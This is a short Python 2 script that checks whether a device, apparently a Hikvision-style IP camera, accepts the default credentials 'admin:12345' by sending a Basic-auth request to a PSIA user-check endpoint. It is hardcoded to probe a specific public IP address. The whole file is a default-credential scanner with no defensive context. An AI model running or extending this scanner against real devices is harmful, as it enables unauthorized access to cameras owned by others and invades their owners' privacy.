import base64
import requests
from threading import *

user = 'admin:12345'
url =  '/PSIA/Custom/SelfExt/userCheck'

def scan(ip):
    print ip
    ip = ip.strip('\n')
    site = "http://" + ip
    site = site + url
    user_pass = 'Basic ' + base64.b64encode(user)
    headers = {'Authorization': user_pass}
    try:
        r = requests.get(site, headers=headers)
        print r, site, user, r.text
    except:
        return 0

if __name__ == '__main__':
    ip = '202.199.233.29'
    scan(ip)
